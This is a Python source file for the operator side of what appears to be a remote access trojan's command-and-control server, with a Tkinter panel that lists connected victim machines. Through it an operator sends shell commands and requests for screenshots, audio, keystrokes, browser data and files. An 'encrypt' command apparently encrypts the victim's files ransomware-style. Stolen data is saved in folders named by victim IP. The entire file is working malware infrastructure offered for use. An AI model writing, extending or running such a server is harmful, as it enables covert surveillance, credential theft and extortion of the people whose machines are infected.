import asyncio
import collections
import logging
import os
import atexit
import socket
import sys
import time
import traceback
from tkinter import messagebox
import tkinter as tk
import queue
import threading

from tools.common_func import log, SocketBridge, fmt_addr
from tools.master_ui import MasterUI
from tools.output_capture import OutputCapture

_listening_sockets = []  # for close at exit

executing = True


class Master(object):
    def __init__(self, customer_listen_addr, communicate_addr=None, agents_queue=None):
        """
        Initialize the CommunicationServer.

        :param customer_listen_addr: Address where customers can connect (equivalent to the -c/--customer parameter).
        :param communicate_addr: Address for communication (equivalent to the -m/--master parameter).
        :param agents_queue: Queue for pending customers who have connected but not yet assigned an agent (optional).
        """
        # Dictionary to store thread pools for various tasks
        self.thread_pool = {"spare_agent": {}, "working_agent": {}}

        # Create a SocketBridge instance for data exchange
        self.socket_bridge = SocketBridge()

        # Create a custom stream to capture output
        self.output_capture = OutputCapture()

        # A queue for customers who have connected but not assigned an agent yet
        self.pending_customers = agents_queue

        self.ui = MasterUI(self, self.pending_customers)

        # Communication address
        self.communicate_addr = communicate_addr

        # Format the communication address
        _fmt_communicate_addr = fmt_addr(self.communicate_addr)

        # If not using an external agent pool, initialize the agent pool and the listening agent
        self.external_agent = False
        self.agent_pool = collections.deque()

        # Prepare a Thread object for listening to incoming agents (not activated yet)
        self.thread_pool["listen_agent"] = threading.Thread(
            target=self._listen_agent,
            name="listen_agent-{}".format(_fmt_communicate_addr),
            daemon=True,
        )

        # Prepare a Thread object for listening to incoming customers (not activated yet)
        self.customer_listen_addr = customer_listen_addr
        self.thread_pool["listen_customer"] = threading.Thread(
            target=self._listen_customer,
            name="listen_customer-{}".format(_fmt_communicate_addr),
            daemon=True,
        )

        # Prepare a Thread object for handling heartbeats (not activated yet)
        self.thread_pool["heart_beat_daemon"] = threading.Thread(
            target=self.run_heart_beat_daemon,
            name="heart_beat_daemon-{}".format(_fmt_communicate_addr),
            daemon=True,
        )

        # Prepare a Thread object for assigning agents to customers (not activated yet)
        self.thread_pool["assign_agent_daemon"] = threading.Thread(
            target=self._assign_agent_daemon,
            name="assign_agent_daemon-{}".format(_fmt_communicate_addr),
            daemon=True,
        )

    @atexit.register
    def close_listening_socket_at_exit(self):
        log.info("exiting...")
        for s in _listening_sockets:
            address = s.getsockname()
            log.info("closing socket: {} {}".format(address[0], address[1]))
            self.try_close(s)

    def try_close(self, closable):
        try:
            self.ui.update_connected_ips_listbox(self.agent_pool, closable.getpeername(), action="remove")
            closable.close()
        except OSError:
            pass

    def run_heart_beat_daemon(self):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self._heart_beat_daemon())

    def serve_forever(self):
        """
        Start serving customers and agents indefinitely.
        """
        if not self.external_agent:
            self.thread_pool["listen_agent"].start()
        self.thread_pool["heart_beat_daemon"].start()
        self.thread_pool["listen_customer"].start()
        self.thread_pool["assign_agent_daemon"].start()
        self.thread_pool["socket_bridge"] = self.socket_bridge.start_as_daemon()

    async def _send_heartbeat(self, conn_agent):
        try:
            conn_agent.send("heartbeat".encode('utf-8'))
            response = conn_agent.recv(1024).decode('utf-8')
            if response == "heartbeat":
                self.ui.heartbeat_label.insert("1.0", "♥")  # Insert the new output
            return True
        except Exception as e:
            print(f"Error: {e}")
            self.ui.update_connected_ips_listbox(self.agent_pool, conn_agent.getpeername(), action="remove")
            return False

    async def _heartbeat_agent(self, agent):
        """
        Perform the heartbeating process for a single agent asynchronously.
        """
        addr_agent = agent["addr_agent"]
        if agent["can_beat"]:
            start_time = time.perf_counter()
            try:
                hb_result = await self._send_heartbeat(agent["conn_agent"])
            except Exception as e:
                log.warning(f"Heartbeat: Error during heartbeat for agent {addr_agent}: {e}")
                log.debug(traceback.format_exc())
                hb_result = False
            finally:
                time_used = round((time.perf_counter() - start_time) * 1000.0, 2)
                await asyncio.sleep(1)
                # Delete the existing text using an appropriate method (e.g., Tkinter update)

        else:
            hb_result = True
            time_used = 0

        if not hb_result:
            log.warning(f"Heartbeat: Agent {addr_agent} heartbeat failed. Time spent: {time_used}s")
            self.try_close(agent["addr_agent"])
            del agent["addr_agent"]

        else:
            if time_used != 0:
                log.debug(f" Agent: {addr_agent} heartbeat success, time: {time_used}s")
            else:
                current_command = agent["current_command"]
                log.warning(f" Agent: {addr_agent} heartbeat wasn't received. "
                            f"Agent is busy processing: {current_command}")

    async def _heart_beat_daemon(self):
        """
        Perform the heartbeating process for agents concurrently using asyncio.
        """
        default_delay = 5
        delay = default_delay
        log.info(f"Heartbeat daemon started. Heartbeat interval: {delay} seconds.")

        while True:
            agent_count = len(self.agent_pool)
            log.info(f"Pulsing heartbeat to all {agent_count} connections...")
            if agent_count == 0:
                log.warning("Heartbeat: No agent available, keep sleeping")
                # Restore default delay if there is no agent
                delay = default_delay
                await asyncio.sleep(delay)
                continue

            # Create a list of asynchronous tasks for heartbeating each agent
            tasks = [self._heartbeat_agent(agent) for agent in self.agent_pool]

            # Execute all tasks concurrently
            await asyncio.gather(*tasks)
            self.ui.heartbeat_label.delete("1.0", "end")  # Clear the text
            await asyncio.sleep(delay)

    def _get_an_active_agent(self, connection_to_match):
        """
        Get and activate an agent for data transfer.

        :param connection_to_match: The connection to match with an agent.
        :return: The activated agent's connection socket or None if not found.
        """
        try_count = 100
        while try_count > 0:
            dict_agent = self._find_agent_by_connection(connection_to_match)

            if dict_agent is not None:
                conn_agent = dict_agent["conn_agent"]

                return conn_agent

            try_count -= 1
            if try_count % 10 == 0:
                log.error("!!NO SLAVER AVAILABLE!! trying {}".format(try_count))
            time.sleep(0.02)

        return None

    def _find_agent_by_connection(self, connection_to_match):
        """
        Find an agent by its connection in the agent pool.

        :param connection_to_match: The connection to match with an agent.
        :return: The agent dictionary if found, else None.
        """
        try:
            return next(agent for agent in self.agent_pool if agent["conn_agent"].getpeername() == connection_to_match)
        except StopIteration:
            return None

    def receive_file_from_agent(self, conn_agent, command):
        try:
            # Receive the output size and log data from the agent
            output_string = self.receive_output_from_agent(conn_agent)
            if output_string is None:
                return False

            # Receive the file size and file data from the agent
            filename, received_data = self.receive_file_data_from_agent(conn_agent, command)
            if filename is None or received_data is None:
                return False

            # Save the received file
            self.save_received_file(filename, received_data, conn_agent)

            return True

        except Exception as e:
            print(f"Failed to receive file from agent: {e}")
            self.ui.update_progress_bar("error")
            return False

    def receive_output_from_agent(self, conn_agent):
        data = conn_agent.recv(4096)
        output_size = data.decode('utf-8')
        print(f"Log size: {output_size}")
        received_size = 0
        output_string = b""

        while received_size < int(output_size):
            remaining_bytes = int(output_size) - received_size
            chunk_size = min(remaining_bytes, 8192)
            data = conn_agent.recv(chunk_size)
            if not data:
                self.ui.update_progress_bar(100)
                break
            output_string += data
            received_size += len(data)
            percentage = (len(output_string) / int(output_size)) * 100
            self.ui.update_progress_bar(percentage)

        print("\n~*~*~*~*~*~*~*~*~*~*~*~*~AGENT OUTPUT START*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*\n")
        print(f"{output_string.decode('utf-8')}")
        print("~*~*~*~*~*~*~*~*~*~*~*~*~AGENT OUTPUT END~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*\n")

        return output_string.decode('utf-8')

    def receive_file_data_from_agent(self, conn_agent, command):
        data = conn_agent.recv(4096)
        filesize, filename = data.decode('utf-8').split("§")
        print(f"File size: {filesize}")

        if filesize == "error":
            if "encrypt" in command or "cmd" in command:
                command = command.split('╚')[0]
            print("❌❌❌❌❌❌❌❌❌❌❌❌ERROR❌❌❌❌❌❌❌❌❌❌❌❌❌❌\n"
                  f"Error executing command {command}.\n"
                  "See log above.")
            self.ui.update_progress_bar("error")
            return None, None

        if filesize == "encrypt_done":
            print("Encryption of files done.")
            return None, None

        file_size_in_mb = int(filesize) / (1024 * 1024)

        print(f"Receiving new file: {filename} - size: {round(file_size_in_mb, 2)} mb")

        self.ui.update_progress_bar(0)

        received_data = b''  # Initialize an empty byte string to store the received data

        while len(received_data) < int(filesize):
            remaining_bytes = int(filesize) - len(received_data)
            chunk_size = min(remaining_bytes, 81920)
            data = conn_agent.recv(chunk_size)
            if not data:
                self.ui.update_progress_bar(100)
                break
            received_data += data
            percentage = (len(received_data) / int(filesize)) * 100
            self.ui.update_progress_bar(percentage)

        print(f"Downloaded file size: {len(received_data)} bytes")

        return filename, received_data

    @staticmethod
    def save_received_file(filename, received_data, conn_agent):
        # Get the IP address of the connection
        connection_ip = conn_agent.getpeername()[0]

        # Create the directory structure if it doesn't exist
        directory = os.path.join('received', connection_ip)
        os.makedirs(directory, exist_ok=True)

        # Create the full file path
        file_path = os.path.join(directory, filename)

        # Save the file data to a file
        with open(file_path, 'wb') as file:
            file.write(received_data)

        print(f'File {filename} received successfully. Saved at: {directory}/{filename}')

    def mark_agent_as_available(self, conn_agent, available, command):
        for agent in self.agent_pool:
            if agent['addr_agent'] == conn_agent.getpeername():
                agent['can_beat'] = available
                if available:
                    agent['current_command'] = "Idle"
                else:
                    agent['current_command'] = command
                print(
                    f"Agent: {conn_agent.getpeername()} is "
                    f"{'available' if available else 'not available'} for commands.")

    def run_in_thread(self, conn_agent, conn_customer, command):
        """
        Run a command in a separate thread and communicate with the agent.

        Args:
            conn_agent (socket.socket): The socket connection to the agent.
            conn_customer (socket.socket): The socket connection to the customer.
            command (str): The command to be executed.

        Returns:
            None
        """
        start_time = time.time()

        self.mark_agent_as_available(conn_agent, False, command)

        try:
            conn_agent.send(command.encode('utf-8'))

            if command.startswith("cmd╚") or command == "info":
                self.receive_output_from_agent(conn_agent)

            elif any(word in command for word in ['files', 'screenshot', 'audio', 'keys', 'browsers', 'encrypt']):
                self.receive_file_from_agent(conn_agent, command)

        except Exception as e:
            print(f"Couldn't send the command and retrieve a file. Why: {e}")

        finally:

            if isinstance(conn_customer, socket.socket):
                conn_address = conn_customer.getpeername()
            else:
                conn_address = conn_customer

            conn_agent.send("OK".encode('utf-8'))
            # Mark the agent as available
            self.mark_agent_as_available(conn_agent, True, command)
            self.ui.update_connected_ips_listbox(self.agent_pool, conn_address, action="remove", command="connected")
            self.calculate_and_display_elapsed_time(start_time)

    def calculate_and_display_elapsed_time(self, start_time):
        """
        Calculate and display the elapsed time since the command started.

        Args:
            start_time (float): The start time of the command.

        Returns:
            None
        """
        end_time = time.time()
        elapsed_time = end_time - start_time
        print(f"Time spent executing the command: {round(elapsed_time)} seconds")

        self.ui.update_and_display_output_tab()

    def _assign_agent_daemon(self):
        """
        Assign an agent to a customer in a daemon thread.
        """
        while True:
            # get a newly connected customer
            conn_customer, addr_customer, command = self.pending_customers.get()

            try:
                conn_agent = self._get_an_active_agent(conn_customer)

                self.ui.update_connected_ips_listbox(self.agent_pool, conn_customer, action="update", command=command)

            except ConnectionError as e:
                log.error(f'error in getting agent: {e}', exc_info=True)
                continue

            if conn_agent is None:
                log.warning("Closing customer[%s] because no available agent found", addr_customer)
                self.try_close(conn_customer)
                self.ui.update_connected_ips_listbox(self.agent_pool, conn_customer, action="remove", command=command)

                continue
            else:
                log.debug("Using agent: %s for %s", conn_agent.getpeername(), command)

            # After getting an agent:
            new_thread = threading.Thread(target=self.run_in_thread, args=(conn_agent, conn_customer, command))
            new_thread.start()

    @staticmethod
    def try_bind_port(sock, addr):
        while True:
            try:
                sock.bind(addr)
            except Exception as e:
                log.error((" unable to bind {}, {}. If this port was used by the recently-closed shootback itself\n"
                           "then don't worry, it would be available in several seconds\n"
                           "we'll keep trying....").format(addr, e))
                log.debug(traceback.format_exc())
                time.sleep(3)
            else:
                break

    def _listen_agent(self):
        """
        Listen for incoming connections from agents.
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.try_bind_port(sock, self.communicate_addr)
        sock.listen()
        _listening_sockets.append(sock)
        log.info("Listening for agents: {}".format(
            fmt_addr(self.communicate_addr)))
        while True:
            conn, addr = sock.accept()

            message = conn.recv(1024)

            if message.decode('utf-8') != "":
                self.agent_pool.append({
                    "addr_agent": addr,
                    "conn_agent": conn,
                    "can_beat": True,
                    "current_command": "Idle"
                })
                log.info("Got agent {} Total: {}".format(
                    fmt_addr(addr), len(self.agent_pool)
                ))

                self.ui.update_connected_ips_listbox(self.agent_pool, addr,
                                                     message=message.decode('utf-8'), action="add")

    def _listen_customer(self):
        """
        Listen for incoming connections from customers.
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.try_bind_port(sock, self.customer_listen_addr)
        sock.listen(20)
        _listening_sockets.append(sock)
        log.info("Listening for customers: {}".format(
            fmt_addr(self.customer_listen_addr)))
        while True:
            conn_customer, addr_customer = sock.accept()
            log.info("Serving customer: {} Total customers: {}".format(
                addr_customer, self.pending_customers.qsize() + 1
            ))

            # just put it into the queue,
            # let _assign_agent_daemon() do the rest
            # don't block this loop
            self.pending_customers.put((conn_customer, addr_customer))

    def perform_action(self, agent_pool, command, button_name):
        sys.stdout = self.output_capture
        try:
            selected_item = self.ui.connected_ips_listbox.get(self.ui.connected_ips_listbox.curselection())
            if selected_item:
                print(f"Selected Agent: {selected_item}")
                # Extract the IP and port from the selected item
                try:
                    _, selected_ip, selected_port = selected_item.split(':')
                except ValueError:
                    # Show a warning popup
                    messagebox.showwarning("Warning", "Wait the current Agent finish its job.")
                    return

                selected_port = int(selected_port.split(' -')[0])
                # Perform the desired action for the selected IP and port
                print(f"Agent: ('{selected_ip}', {selected_port}) "
                      f"is being added to the working pool to process command: {command}")
                agent = (selected_ip.strip(), selected_port)
                self.ui.current_output_tab = button_name
                agent_pool.put((agent, selected_ip.strip(), command))
        except tk.TclError:
            print("No item selected in the listbox.")


def run_master(communicate_addr, customer_listen_addr, agents_queue, verbose=True, quiet=False):
    is_verbose = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(level=logging.WARNING if quiet else is_verbose)

    master = Master(customer_listen_addr, communicate_addr, agents_queue=agents_queue)

    # Thread for running the GUI
    gui_thread = threading.Thread(target=master.ui.create_gui)
    gui_thread.start()

    master.serve_forever()


if __name__ == "__main__":
    master_addr = ('0.0.0.0', 5555)
    customer_addr = ('0.0.0.0', 10022)

    # Create the pending_customers queue
    pending_customers = queue.Queue()

    # Thread for running the master
    master_thread = threading.Thread(target=run_master, args=(master_addr, customer_addr, pending_customers))
    master_thread.start()
